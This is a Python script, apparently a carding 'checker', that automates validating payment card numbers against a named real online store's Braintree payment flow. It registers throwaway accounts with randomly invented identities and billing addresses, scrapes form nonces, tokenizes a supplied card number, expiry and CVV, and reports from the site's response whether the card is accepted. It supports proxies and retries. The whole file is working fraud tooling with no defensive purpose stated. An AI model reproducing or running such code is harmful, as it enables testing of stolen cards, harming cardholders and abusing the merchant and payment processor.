import requests, random, string, re, base64, json, time
from datetime import datetime

def generate_random_email(length=10):
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length)) + "@gmail.com"

def get_random_identity():
    first_names = ["James","John","Robert","Michael","William","David","Joseph","Thomas","Charles","Daniel"]
    last_names = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez"]
    streets = ["Oak Street","Maple Avenue","Cedar Lane","Pine Road","Elm Drive","Washington Blvd"]
    cities = ["New York","Los Angeles","Chicago","Houston","Phoenix","Philadelphia"]
    states = ["NY","CA","TX","FL","IL","PA"]
    first = random.choice(first_names)
    last = random.choice(last_names)
    street_num = random.randint(100, 9999)
    street = random.choice(streets)
    city = random.choice(cities)
    state = random.choice(states)
    zipcode = random.randint(10000, 99999)
    phone = f"1{random.randint(200, 999)}{random.randint(1000000, 9999999)}"
    return {
        "first_name": first, "last_name": last,
        "company": f"{last} Inc", "address": f"{street_num} {street}",
        "city": city, "state": state, "postcode": str(zipcode),
        "phone": phone, "email": generate_random_email()
    }

def safe_regex_search(pattern, text, group_num=1, default=None):
    match = re.search(pattern, text)
    if match and group_num <= len(match.groups()):
        return match.group(group_num)
    return default

def check_b3n(cc, month, year, cvv, proxy=None):
    try:
        mm = month.zfill(2)
        yy = year if len(year) == 4 else f"20{year}"

        for attempt in range(3):
            identity = get_random_identity()
            session = requests.Session()
            if proxy:
                session.proxies = {"http": proxy, "https": proxy}

            headers = {
                'authority': 'www.dnalasering.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.dnalasering.com',
                'referer': 'https://www.dnalasering.com/my-account/',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            }

            # 1. Get registration nonce
            resp = session.post('https://www.dnalasering.com/my-account/', headers=headers, timeout=30)
            reg_nonce = safe_regex_search(r'name="woocommerce-register-nonce".*?value="([^"]+)"', resp.text)
            if not reg_nonce:
                if attempt < 2: time.sleep(2); continue
                return False, "Failed to get registration nonce"

            # 2. Register
            reg_data = {
                'email': identity["email"],
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': '(none)',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': 'https://www.dnalasering.com/',
                'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'wc_order_attribution_session_pages': '3',
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': headers['user-agent'],
                'woocommerce-register-nonce': reg_nonce,
                '_wp_http_referer': '/my-account/',
                'register': 'Register',
            }
            session.post('https://www.dnalasering.com/my-account/', headers=headers, data=reg_data, timeout=30)

            # 3. Set billing address
            resp = session.get('https://www.dnalasering.com/my-account/edit-address/billing/', headers=headers, timeout=30)
            nonce_addr = safe_regex_search(r'name="woocommerce-edit-address-nonce".*?value="([^"]+)"', resp.text)
            if not nonce_addr:
                if attempt < 2: time.sleep(2); continue
                return False, "Failed to get address nonce"

            billing_data = {
                'billing_email': identity["email"],
                'billing_first_name': identity["first_name"],
                'billing_last_name': identity["last_name"],
                'billing_company': identity["company"],
                'billing_country': 'US',
                'billing_address_1': identity["address"],
                'billing_address_2': '',
                'billing_city': identity["city"],
                'billing_state': identity["state"],
                'billing_postcode': identity["postcode"],
                'billing_phone': identity["phone"],
                'save_address': 'Save address',
                'woocommerce-edit-address-nonce': nonce_addr,
                '_wp_http_referer': '/my-account/edit-address/billing/',
                'action': 'edit_address',
            }
            session.post('https://www.dnalasering.com/my-account/edit-address/billing/', headers=headers, data=billing_data, timeout=30)

            # 4. Go to add payment method
            resp = session.get('https://www.dnalasering.com/my-account/add-payment-method/', headers=headers, timeout=30)
            client_token = safe_regex_search(r'"client_token_nonce":"(.*?)"', resp.text)
            woo_nonce = safe_regex_search(r'id="woocommerce-add-payment-method-nonce".*?value="(.*?)"', resp.text)
            if not client_token or not woo_nonce:
                if attempt < 2: time.sleep(2); continue
                return False, "Failed to get payment nonces"

            # 5. Get Braintree token
            ajax_headers = {
                'authority': 'www.dnalasering.com',
                'accept': '*/*',
                'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.dnalasering.com',
                'referer': 'https://www.dnalasering.com/my-account/add-payment-method/',
                'user-agent': headers['user-agent'],
                'x-requested-with': 'XMLHttpRequest',
            }
            resp = session.post('https://www.dnalasering.com/wp-admin/admin-ajax.php',
                                data={'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_token},
                                headers=ajax_headers, timeout=30)
            try:
                enc = resp.json()['data']
                decoded = json.loads(base64.b64decode(enc).decode())
                auth = decoded['authorizationFingerprint']
            except:
                if attempt < 2: time.sleep(2); continue
                return False, "Failed to decode Braintree token"

            # 6. Tokenize card
            bt_headers = {
                'authority': 'payments.braintree-api.com',
                'accept': '*/*',
                'authorization': f'Bearer {auth}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
                'user-agent': headers['user-agent']
            }
            tokenize_payload = {
                'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': '4474a8a7-7389-4920-a4e3-9b63b9f6d3d7'},
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
                'variables': {'input': {'creditCard': {'number': cc, 'expirationMonth': mm, 'expirationYear': yy, 'cvv': cvv}}}
            }
            resp = session.post('https://payments.braintree-api.com/graphql', headers=bt_headers, json=tokenize_payload, timeout=30)
            try:
                token = resp.json()['data']['tokenizeCreditCard']['token']
            except:
                return False, "Tokenization failed"

            # 7. Add payment method
            add_data = [
                ('payment_method', 'braintree_credit_card'),
                ('wc-braintree-credit-card-card-type', 'master-card'),
                ('wc-braintree-credit-card-3d-secure-enabled', ''),
                ('wc-braintree-credit-card-3d-secure-verified', ''),
                ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
                ('wc_braintree_credit_card_payment_nonce', token),
                ('wc_braintree_device_data', '{"correlation_id":"4474a8a7-7389-4920-a4e3-9b63b9f6"}'),
                ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
                ('woocommerce-add-payment-method-nonce', woo_nonce),
                ('_wp_http_referer', '/my-account/add-payment-method/'),
                ('woocommerce_add_payment_method', '1'),
            ]
            resp = session.post('https://www.dnalasering.com/my-account/add-payment-method/', headers=headers, data=add_data, timeout=30)

            if any(x in resp.text for x in ['Nice!', 'AVS', 'avs', 'payment method was added', 'successfully added']):
                return True, "Payment method added successfully"
            else:
                error_match = re.search(r'<ul class="woocommerce-error".*?<li>(.*?)</li>.*?</ul>', resp.text, re.DOTALL)
                if error_match:
                    error_msg = re.sub(r'<[^>]+>', '', error_match.group(1)).strip()
                    return False, error_msg
                return False, "Card declined"
        return False, "Max retries exceeded"
    except Exception as e:
        return False, str(e)[:100]
